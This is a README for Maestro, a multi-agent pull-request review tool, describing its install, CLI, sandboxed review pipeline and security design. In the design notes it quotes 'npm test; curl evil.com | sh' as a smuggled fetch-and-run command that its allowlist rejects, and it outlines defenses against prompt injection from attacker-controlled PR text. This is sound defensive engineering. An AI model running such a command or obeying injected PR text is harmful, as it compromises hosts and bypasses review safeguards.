# Maestro

Multi-agent pull request review. Maestro watches GitHub for new and updated PRs, spins up an
ephemeral isolated environment per PR, runs a crew of specialist review agents against it in
parallel, and has a triage step merge their findings into **one** consolidated review comment.

The review pipeline is not hardcoded. It is a **versioned playbook** — a graph, a set of agents
with editable personas and per-agent model bindings, router rules, and an environment spec —
stored in the database and edited visually in the Studio. The engine is an interpreter over that
graph, so adding a reviewer or repointing one at a different LLM provider is a config change, not
a code change.

## Install

This repository is private, so the installer needs a token that can read it. `MAESTRO_TOKEN`
covers both the script and the release asset:

```sh
export MAESTRO_TOKEN=$(gh auth token)
curl -fsSL -H "Authorization: Bearer $MAESTRO_TOKEN" \
  https://raw.githubusercontent.com/mustafarslan/maestro/master/install.sh | sh
maestro init
maestro doctor
```

Once the repository is public, the token drops out and the first line is the whole install:

```sh
curl -fsSL https://raw.githubusercontent.com/mustafarslan/maestro/master/install.sh | sh
```

Docker is the one dependency Maestro cannot install for you; `doctor` checks for it.

## Use it

```sh
# Review a pull request, or a local checkout
maestro review https://github.com/owner/repo/pull/412
maestro review ~/code/my-app --base HEAD~1

# Run the daemon: webhooks or polling, workers, and the admin UI
maestro serve --poll owner/repo --admin-port 7777
maestro serve --webhook-port 8080 --webhook-secret "$SECRET"

# Expose Maestro to Claude Code
claude mcp add maestro -- maestro mcp

# Configure and inspect
maestro llm providers | models | test
maestro playbook export pb.yaml && maestro playbook import pb.yaml --activate
maestro eval add my-case ./repo && maestro eval run && maestro eval report
maestro reap
```

`maestro serve` prints a URL with a token. That opens the admin UI: a live review board, a span
waterfall per review, the Playbook Studio, and provider spend.

## How it works

```
webhook / poll → Review(repo, pr, head_sha, playbook_version)
   │
   ├─ prepare-env   clone at head, detect toolchain, install deps, snapshot the image
   ├─ router        which agents apply, and at what budget
   │
   ├─ agent:product      ─┐
   ├─ agent:security      │ in parallel, each in its OWN container off that one snapshot
   ├─ agent:architecture  │
   ├─ agent:ui-ux        ─┘
   │
   ├─ triage        dedupe, cross-agent agreement, calibrate, rank, threshold
   ├─ post          ONE consolidated comment + what was actually checked
   └─ [finalizer]   destroy containers, volumes and snapshots — always
```

## Design notes

**Two security postures, asserted rather than assumed.** `prepare` is the only phase with a
network, and it runs on a per-review `--internal` Docker network whose only route out is an
allowlist proxy container — no default route, no external DNS, so the allowlist is a control
rather than a request. The proxy blocks CONNECT *and* plain HTTP, because npm and pip use both.
`analyze` runs with `--network none`, a read-only rootfs, all capabilities dropped, no secrets
and no Docker socket. `packages/sandbox/src/docker.integration.test.ts` asserts every one of
those against real containers — a typo in a `docker run` flag is otherwise completely silent.

The prepare-phase claim is asserted the only way it can honestly be: a probe running inside the
real prepare container, using Node's `fetch`, which ignores `HTTP_PROXY` entirely. Under the
older advisory posture it reaches the internet; under the enforced default it reaches nothing.
Both are tests, so the two can never quietly become the same thing.

**Agents have no capability to act.** They get read-only tools, no network, and no GitHub
credential; `run_command` matches the allowlist by exact string, never by prefix, so
`npm test; curl evil.com | sh` cannot pass as `npm test`. Only the orchestrator posts. This is why
it is safe to feed attacker-controlled PR text to a model at all — see
`packages/agents/src/injection.test.ts`.

**Prompt layering.** A system prompt is a fixed preamble (untrusted-content rules, tool contract)
+ the editable persona + a fixed output contract. The wrapper lives in code so no persona edit —
including one made in the Studio — can remove the injection defenses.

**The product agent reads the ticket, not just the PR description.** When `LINEAR_API_KEY`
is set, Maestro resolves the issue from the branch name, PR body or title — in that order, because
a branch name is chosen before any work and is what Linear's own git integration generates — and
injects its acceptance criteria into the product agent's context. The PR description is the
author's account of what they built; the ticket is the independent record of what was asked for,
and checking one against the other is the whole job. Linear is never exposed as an agent tool:
agents run offline with no credentials, so the orchestrator fetches and the agent reads text.
Every failure — no key, no issue referenced, an unreachable tracker — degrades to a review without
ticket context rather than a failed review, and the comment says which issue it checked against.

**Agents are scheduled across reviews, not within one.** A worker pool admits agent tasks under
global, per-agent, per-repo and per-provider limits, rotating across reviews rather than FIFO. So
while the product agent is saturated on PR #1, the security and architecture agents flow to PR #2
instead of queueing behind it, and a 40-file pull request cannot starve a 2-file one that arrived
later. A slot is taken *before* the container is created — admitting first would hold a container's
memory and disk for the whole wait.

**Teardown is not a graph node.** It is a finalizer that runs on every terminal state, so no
drawable graph can leak containers.

**Maestro owns the agent loop.** The Vercel AI SDK is used for per-call provider normalisation
only; its retry and multi-step helpers are switched off. Owning the loop is what makes per-agent
budgets, honest token accounting and the terminal-tool contract possible. Providers are
*instances*: `openai-compatible` covers Ollama, vLLM, LM Studio and OpenRouter with one row each.

**Pricing is data with provenance.** `packages/llm/src/pricing.ts` carries a `fetchedAt` stamp and
a source per provider, because those numbers go into a PR comment. Cached and uncached input
tokens are billed disjointly, and an unknown model reports "unpriced" rather than a fabricated
zero.

**The comment reports what it checked, never how accurate it was.** Precision and recall need
human feedback that does not exist when the comment is written. They are gathered afterwards from
reactions and later edits, and shown in the UI.

## Layout

| Package | Purpose |
| --- | --- |
| `packages/core` | store, portable SQLite driver, migrations, job queue, spans, incremental planning |
| `packages/playbook` | schema, graph validation, node registry, prompt layering, versioned store |
| `packages/llm` | provider adapters, agent loop, budgets, pricing, conformance suite |
| `packages/sandbox` | Docker driver, two-phase isolation, egress proxy, toolchain detection, cache, reaper |
| `packages/agents` | read-only tool surface, Finding schema, agent runner |
| `packages/engine` | graph interpreter, router, triage, rendering, persistence, eval scoring |
| `packages/integrations` | GitHub App/PAT, webhooks, poller, review posting, feedback ingestion |
| `packages/server` | daemon, scheduler, admin API, SSE, embedded UI |
| `packages/mcp` | stdio MCP server |
| `packages/ui` | React + React Flow admin SPA |
| `apps/cli` | the `maestro` binary |

## Develop

Requires Node 22.14+, pnpm, Docker, and [Bun](https://bun.sh) for the binary build.

```sh
pnpm install
pnpm typecheck
pnpm test              # includes real-Docker integration tests
pnpm run build:binary  # -> dist/maestro
```

## Deploying

`maestro serve` on a host is the supported deployment: it is one binary, and the installer above is
the whole setup.

`docker-compose.yml` is included but **experimental and unrun**. Maestro is a container there while
its sandboxes are siblings on the host daemon, so the egress proxy has to bind a port that is both
fixed and published for them to reach it (`MAESTRO_PROXY_PORT_RANGE`, published on the bridge
gateway). That is wired and unit-tested; it has never been run on a real Linux host.

## Triggering a review

Automatically, on `opened` / `reopened` / `ready_for_review` / `synchronize` — or on demand
by commenting on the pull request:

```
@maestro review
```

`/maestro review` works too, and trailing words are ignored, so `@maestro review it please`
is fine.

Only people GitHub reports as `OWNER`, `MEMBER` or `COLLABORATOR` may ask: a review starts
containers and spends money, and on a public repository a comment is anyone's to write.

To review **only** when asked, set `router.automaticTriggers: false` in the playbook — or flip
"Review every pull request automatically" in the Studio. The lifecycle events above then start
nothing. Not for `--poll`, which cannot see comments; the daemon says so if you try.

## Reference

- [Configuration](docs/CONFIGURATION.md) — credentials, state, sandbox networking, self-hosting
- [Status](docs/STATUS.md) — what is verified against reality, and what is not
- [TODO](docs/TODO.md) — what is deliberately not built yet, and why

## Status

All ten phases of the implementation plan are landed. What is verified, and what is not, is
recorded honestly in `docs/STATUS.md`.
